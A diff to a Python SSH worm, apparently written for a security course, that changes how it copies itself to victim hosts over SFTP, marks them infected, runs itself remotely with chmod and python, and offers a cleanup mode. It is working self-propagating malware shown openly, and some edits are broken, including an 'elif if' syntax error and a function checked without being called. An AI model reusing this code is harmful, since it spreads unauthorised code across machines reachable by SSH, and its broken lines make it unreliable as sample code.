@@ -15,6 +15,7 @@ credList = [
 ]
 
 # The file marking whether the worm should spread
+LOCAL_PATH = "/tmp"
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
 
 ##################################################################
@@ -37,7 +38,8 @@ def markInfected():
 	# Mark the system as infected. One way to do
 	# this is to create a file called infected.txt
 	# in directory /tmp/
-	with open(INFECTED_MARKER_FILE, 'w'): pass
+	with open(INFECTED_MARKER_FILE, 'w')as f:
+		f.write("You've got Worms")
 
 ###############################################################
 # Spread to the other system and execute
@@ -58,8 +60,16 @@ def spreadAndExecute(sshClient):
 	sftp = sshClient.open_sftp()
 	# Need full path and file name to not fck up
 	sftp.put("/tmp/worm.py", "/tmp/worm.py")
-	sftp.put(INFECTED_MARKER_FILE,INFECTED_MARKER_FILE)
-	# I don't think you need to make a py file executable like a .sh file but w/e
+	# If this machine is not infected (Means it should be attacker machine)
+	if not isInfectedSystem():
+		# You have to create the file
+		sftpfile = sftp.file(INFECTED_MARKER_FILE,'w')
+		sftpfile.write("You've got Worms")
+		sftpfile.close()
+	# Otherwise it's a victim machine that should have the infect_mark_file
+	else:
+		sftp.put(INFECTED_MARKER_FILE,INFECTED_MARKER_FILE)
+	# I don't think you need to make a .py file executable like a .sh file but w/e
 	stds1 = sshClient.exec_command("chmod /tmp/worm.py 777")
 	# Execute on victim machine
 	stds2 = sshClient.exec_command("python /tmp/worm.py")
@@ -235,7 +245,7 @@ def cleaner(sshClient):
 
 if len(sys.argv) < 2:
 	
-	# TODO: If we are running on the victim, check if 
+	# If we are running on the victim, check if 
 	# the victim was already infected. If so, terminate.
 	# Otherwise, proceed with malice.
 
@@ -264,9 +274,11 @@ for host in networkHosts:
 	
 	
 	# Did the attack succeed?
-	if sshInfo:			
+	if sshInfo:
+		# the comma means print with no new line
 		print "sshInfo: ",
 		print sshInfo
+
 		print "Trying to spread"
 		
 		# Check if the system was	
@@ -279,7 +291,7 @@ for host in networkHosts:
 		# the code below:
 		# try:
 	        #	 remotepath = '/tmp/infected.txt'
-		#        localpath = '/home/cpsc/'
+		#        LOCAL_PATH = '/home/cpsc/'
 		#	 # Copy the file from the specified
 		#	 # remote path to the specified
 		# 	 # local path. If the file does NOT exist
@@ -288,7 +300,7 @@ for host in networkHosts:
 		# 	 # (that is, we know the system is
 		# 	 # not yet infected).
 		# 
-		#        sftp.get(filepath, localpath)
+		#        sftp.get(filepath, LOCAL_PATH)
 		# except IOError:
 		#       print "This system should be infected"
 		#
@@ -297,14 +309,22 @@ for host in networkHosts:
 		# Otherwise, infect the system and terminate.
 		# Infect that system
 		try:
-			localpath = "/tmp"
 			sftp = sshInfo.open_sftp()
-			sftp.get(INFECTED_MARKER_FILE,localpath)
-			# if infectedFile exists, either close sftp or clean
-			if len(sys.argv) >= 2:
-				if sys.argv[1] == '-c' or sys.argv[1] == "--clean":
-					cleaner(sshInfo)
-					print ' ' +  host + ' successfully cleaned'
+			# Try to fetch marker file from victim
+			# If it fails, next lines will be skipped and start after "except IOError:" and we can attack victim system
+			sftp.get(INFECTED_MARKER_FILE,LOCAL_PATH)
+			# We now know victim is infected
+			# If an argument to command line is added and it's -c||--clean we will clean instead of infect
+			elif if len(sys.argv) >=2 and (sys.argv[1] == '-c' or sys.argv[1] == "--clean"):
+				# If argument is added and this machine is infected, then we are a victim machine
+				if isInfectedSystem:
+					# This will throw an OSError if the file does not exist
+					os.remove(INFECTED_MARKER_FILE)
+				# If we are not infected then we are the original cleaning machine
+				cleaner(sshInfo)
+				print ' ' +  host + ' successfully cleaned'
+				# Remove worm file from our own machine
+				os.remove(LOCAL_PATH + "/worm.py")
 			sftp.close()
 			sshInfo.close()
 		# INFECTED_MARKER_FILE does not exist, spread & Exe
@@ -314,12 +334,12 @@ for host in networkHosts:
 			print "worm successfully sent to " + host
 	else:
 		print "No sshInfo"
+
+# If command line args exist and are -c||--clean
+if len(sys.argv) >=2 and (sys.argv[1] == '-c' or sys.argv[1] == "--clean"):
+	print "Cleaning Complete"
+else:
+	print " Spreading Complete"
 	
-if len(sys.argv) >=2:
-	if sys.argv[1] == '-c' or sys.argv[1] == "--clean":
-		os.remove(INFECTED_MARKER_FILE)
-		os.remove("/tmp/worm.py")
-		print "Cleaning Complete"
-	else:
-		print " Spreading Complete"
-	
+
+
